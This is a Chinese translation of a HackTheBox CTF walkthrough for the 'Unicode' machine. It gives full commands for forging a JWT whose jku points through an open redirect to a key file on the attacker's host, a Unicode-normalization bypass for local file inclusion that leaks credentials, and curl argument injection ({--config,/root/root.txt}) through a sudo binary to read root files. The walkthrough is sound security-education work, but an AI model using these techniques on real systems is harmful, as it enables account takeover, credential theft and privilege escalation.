# 来自 HackTheBox 的 Unicode 详细演练

> 原文：<https://infosecwriteups.com/unicode-from-hackthebox-detailed-walkthrough-5da3481816de?source=collection_archive---------0----------------------->

## 展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/1af9e485203c27bb9a4dbb803d624b8f.png)

来自 HackTheBox 的 Unicode

Unicode 是 HackTheBox 上的中型机器。我们最初的扫描找到了一个简单的网站进行研究，从那里我们发现了一个有趣的 JSON Web 令牌的使用。使用 JWT 工具，我们解码，然后制作自己的令牌，以获得对仪表板的管理员访问权限。在这里，我们使用 unicode 过滤器旁路通过本地文件包含漏洞泄漏数据，导致通过 SSH 访问机器。升级到 root 使用了一个二进制文件，我们发现该文件由于误用 curl 参数而易受攻击。

所需技能是对 JSON Web 令牌的基本理解。学到的技能是使用 JWT 工具操纵，然后创建恶意令牌。

[](https://www.hackthebox.com/home/machines/profile/415) [## Unicode —破解盒子::渗透测试实验室

### 登录 Hack The Box 平台，让您的笔测试和网络安全技能更上一层楼！

www.hackthebox.com](https://www.hackthebox.com/home/machines/profile/415) 

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/10fdeecb69c3bdb29fd15e5e4ba205a6.png)

盒子的 Nmap 扫描

只有两个开放的端口。不知道主机名，所以先试试 IP:

![](img/8e388961f4c3f66576848a0b9c942179.png)

黑客媒体网站

这里什么都没有，只是一个静态站点。有趣的是，中间有一个大按钮，上面写着“关于我们的谷歌”。查看 URL，我们看到一个名为“重定向”的子页面:

```
http://10.10.11.126/redirect/?url=google.com
```

# 创造用户

没什么可看的，让我们试着注册一个帐户:

![](img/864a2e1717eb3fd36b3e5408399573c9.png)

注册表单

我试图创建一个名为 admin 的帐户，但我们看到它已经存在。这在后面会很有趣，让我们创建一些别的东西:

![](img/457787b33d695dc4a1786a411f3a731f.png)

注册新用户

作为我们的新用户登录后，我们在这里结束:

![](img/eff61112427e72b71a287a26586347f4.png)

黑客媒体网站上的仪表板

# JSON Web 令牌

有几页可以看，但没什么明显的。让我们用 curl 来看看标题:

```
┌──(root💀kali)-[~/htb/unicode]
└─# curl -i -s -k -X POST -d 'username=pencer&password=password' 'http://10.10.11.126/login/'
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 16 Dec 2021 21:19:53 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 228
Connection: keep-alive
Location: http://10.10.11.126/dashboard/
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw; Path=/
```

# JWT 工具

返回的 cookie 很容易被识别为 JSON Web 令牌(JWT)。这个很好地介绍了这些概念。我们在另一个名为[秘密](https://pencer.io/ctf/ctf-htb-secret/)的盒子里介绍了 JWT，在那个盒子里，我使用了蒂卡尔皮的 [JWT 工具包](https://github.com/ticarpi/jwt_tool)。让我们再次使用它，首先下载脚本:

```
┌──(root💀kali)-[~/htb/unicode/test]
└─# wget https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py
--2021-12-15 22:16:32--  https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133....
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 99348 (97K) [text/plain]
Saving to: ‘jwt_tool.py’
jwt_tool.py            100%[====================================>]  97.02K  --.-KB/s    in 0.03s   
2021-12-15 22:16:33 (3.33 MB/s) - ‘jwt_tool.py’ saved [99348/99348]
```

不带参数运行脚本一次，创建初始配置和文件:

```
┌──(root💀kali)-[~/htb/unicode]
└─# python3 jwt_tool.py

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi      

No config file yet created.
Running config setup.
Configuration file built - review contents of "jwtconf.ini" to customise your options.
Make sure to set the "httplistener" value to a URL you can monitor to enable out-of-band checks.
```

我们现在已经创建了公钥和私钥，以及我们自己的 jwks.json 文件:

```
┌──(root💀kali)-[~/htb/unicode]
└─# ll
total 232
-rw-r--r-- 1 root root  1879 Dec 15 22:13 jwtconf.ini
-rw-r--r-- 1 root root   507 Dec 15 22:13 jwttool_custom_jwks.json
-rw-r--r-- 1 root root   240 Dec 15 22:13 jwttool_custom_private_EC.pem
-rw-r--r-- 1 root root  1674 Dec 15 22:13 jwttool_custom_private_RSA.pem
-rw-r--r-- 1 root root   177 Dec 15 22:13 jwttool_custom_public_EC.pem
-rw-r--r-- 1 root root   450 Dec 15 22:13 jwttool_custom_public_RSA.pem
-rw-r--r-- 1 root root 99348 Dec 15 22:13 jwt_tool.py
```

# 解码 JWT

这些将在我们制造 JWT 有效载荷时使用。我们可以解码收到的 cookie 来检查内容:

```
root@kali:~/htb/unicode# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi
=====================
Token header values:
[+] typ = "JWT"
[+] alg = "RS256"
[+] jku = "http://hackmedia.htb/static/jwks.json"

Token payload values:
[+] user = "pencer"
----------------------
```

我们看到我们创建的用户，我们还看到一个为 hackmedia.htb 的主机名设置的 JKU。[这个](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)涵盖了黑客 JWT 和 JKU 的概念，但基本上 jwks.json 文件是一组 json 编码的公钥，用于对我们作为 cookie 接收的 JWT 进行数字签名。

让我们将 hackmedia 添加到我们的 hosts 文件中，然后看看 jwks.json 文件:

```
┌──(root💀kali)-[~/htb/unicode/test]
└─# echo "10.10.11.126 hackmedia.htb" >> /etc/hosts

┌──(root💀kali)-[~/htb/unicode]
└─# curl http://hackmedia.htb/static/jwks.json                                          
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-
            UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_
            DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
```

# 验证 JWT

这个公共文件用于验证我们的 JWT，我们可以在本地测试它:

```
┌──(root💀kali)-[~/htb/unicode/test]
└─# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw -V -jw jwks.json

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi

JWKS Contents:
Number of keys: 1
--------                                                                                                                                                                                                                   Key 1
kid: hackthebox
[+] kty = RSA
[+] use = sig
[+] kid = hackthebox
[+] alg = RS256
[+] n = AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju
-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF
_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs                                                                                                                           
[+] e = AQAB

Found RSA key factors, generating a public key
[+] kid_hackthebox_1639691778.pem

Attempting to verify token using kid_hackthebox_1639691778.pem
RSA Signature is VALID
```

此时，我们已经获得了通过使用我们的用户帐户登录创建的 cookie，我们已经下载了公共的 jwks.json 文件，并验证了 RSA 签名是有效的。

我们希望创建一个新的令牌，我们可以使用它作为管理员登录到 hackmedia dashboard，因为我们之前发现一个名为的帐户已经存在。首先，让我们重命名自定义的 jwks.json 文件，并启动一个 web 服务器，这样我们就可以访问它了:

```
┌──(root💀kali)-[~/htb/unicode]
└─# mv jwttool_custom_jwks.json jwks.json 

┌──(root💀kali)-[~/htb/unicode]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

# 篡改 JWT

接下来，我们将篡改 cookie，使用户成为管理员。我们还需要重定向 JKU 检查，以便它使用由我们在 Kali 上托管的 jwt 工具创建的自定义检查。然后，我们需要再次对令牌进行签名，以便签名有效。我们可以使用 jwt_tool 创建的密钥对来做到这一点:

```
┌──(root💀kali)-[~/htb/unicode/test]
└─# root@kali:~/htb/unicode# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw  -I -hc jku -hv http://hackmedia.htb/static/../redirect/?url=10.10.14.241/jwks.json -pc user -pv admin -S rs256 -pr jwttool_custom_private_RSA.pem

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi      

jwttool_2e549bdf823847e163cdb9fb301aed1a - Tampered token - RSA Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjI0MS9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.jRPqqWUrVKo4AHWZ6CbCmV-uQbtC9OB_4vIQkrOdB2SZhGXLcBmFMujcz5TkidarraSThjFjpXsNDtacW6h4q8lcFu6ePOqKFErh33dItW5LKEIQrAZTZ2oL6s8kEisYYEPKEfn3m_M0fYZZL4knj8_Hq70LDg0GhW9pJy4GZouMYKNf-ILY9IDavVpg6b-S2t6l0ALEya5AdHdbh3ChMeDduikaeaL_s_r7xPtguXFttYA37bqNgbeREZE8AifJhA9Q-jlMTay3OyjBFXT-diLHIvqGEwWnIkbXHX_lH97Eomv3hDhNJ-pv30FgGXRttwS_aOvth3sCre0fHUVqJQ
```

将这些参数分解一下:

![](img/2fc728a0c8d7151ef86a78e6ec7ad39e.png)

JWT 工具参数

# 在浏览器中插入 JWT

我们看到该工具给了我们一个新的令牌，它被篡改，然后被签名。复制并返回到我们的 web 浏览器，我们仍然以我们创建的用户身份登录到 hackmedia dashboard。通过按 Shift+F9 或转到 Web Developer，然后转到存储检查器，替换我们浏览器中的 cookie:

![](img/9fd165d4f7b87e882dbd1cd26aae79c6.png)

在浏览器中替换 cookie

# 仪表盘

将我们新制作的令牌粘贴到值字段后，我们可以刷新页面，我们将看到我们现在是管理员:

![](img/acb09c02ef2256d3e43fc646e97d31ca.png)

这里唯一的东西是保存报告的两个链接。点击其中一个会将我们带到一个页面，上面写着:

```
The Report is being prepraed. Please comeback later.
```

查看网址，我们看到:

```
http://hackmedia.htb/display/?page=quarterly.pdf
```

一个 URL 参数，如果我们尝试这样篡改:

```
http://hackmedia.htb/display/?page=../../../etc/passwd
```

我们收到一条 404 文件未找到错误消息:

```
we do a lot input filtering you can never bypass our filters. Have a good day
```

# Unicode 筛选器旁路

一个挑战！线索就在盒子的名字里，使用[这个](https://lazarv.com/posts/unicode-normalization-vulnerabilities/)有用的指南我们可以绕过使用 unicode 等价的过滤器。这是我们感兴趣的部分:

![](img/ab70ddca595b45802e43a9b12d0a08ff.png)

路径遍历示例

使用看起来像冒号的字符，我们可以获取 passwd 文件:

![](img/125ab5d2fad3db9e7c3442055cc88afa.png)

使用本地文件包含来读取密码文件

在列举了一些之后，我查看了 nginx.conf 文件:

![](img/efda1025243b2905bfb8316410502a55.png)

nginx.conf 文件的内容

我们看到提到了更多的配置文件，在启用了模块的配置文件中，我们发现了一些有趣的东西:

![](img/a85f7c5eb23f40beb7920adf3a498349.png)

启用模块的文件的内容

有个评论说从 db.yaml 改用户密码，我们也看到位置是/home/code/coder 作为根。如果我们查看该文件，我们会得到凭证:

![](img/2986ba13ddf191fe16e6edcb1a21a55a.png)

在 db.yaml 文件中找到的凭据

# SSH 访问

我们发现 SSH 也重用了密码:

```
root@kali:~/htb/unicode# ssh code@hackmedia.htb
code@hackmedia.htbs password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
code@code:~$
```

# 用户标志

让我们先抓住用户标志:

```
code@code:~$ cat user.txt 
fc82d29ddf1fdf62037b4e9443c03a31
```

像往常一样，首先要检查的是 sudo 权限:

```
code@code:~$ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
```

让我们看看 treport 是做什么的:

```
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:1
Enter the filename:test
Enter the report:test
Enter your choice:2
ALL THE THREAT REPORTS:
threat_report_16_40_45
threat_report_16_41_22
threat_report_16_54_00
threat_report_16_25_52
threat_report_16_21_31

Enter the filename:threat_report_16_40_45
<!doctype html>
<html lang="en" class="h-100">
  <head>
```

所以我可以创建并阅读报告，但是我找不到利用它的方法。第三个选项要求输入 IP 和文件名:

```
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:10.10.11.126/test
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9294  100  9294    0     0  3025k      0 --:--:-- --:--:-- --:--:-- 3025k
Enter your choice:10.10.11.126/test
Wrong Input
```

我从输出中看到 curl 被用来下载文件。

# 权限提升

这花了一段时间，但最终我发现我们可以用花括号传递一个参数给 curl。我们可以使用 config 开关从手册中读入一个文件:

```
-K, --config <file>
    Specify a text file to read curl  arguments  from.  The  command
    line  arguments  found  in the text file will be used as if they
    were provided on the command line.

Example:
    curl --config file.txt https://example.com
```

# 根标志

这允许我们绕过对 URL/IP 的检查，而是读取指定的文件:

```
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:{--config,/root/root.txt}
Warning: /root/root.txt:1: warning: '5423cd0f9bd8573d133fee91e5550b66' is 
Warning: unknown
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
```

那是一个相当棘手的盒子。我希望你喜欢这个演练。

下次见。

如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2022 年 5 月 13 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-unicode/)*。*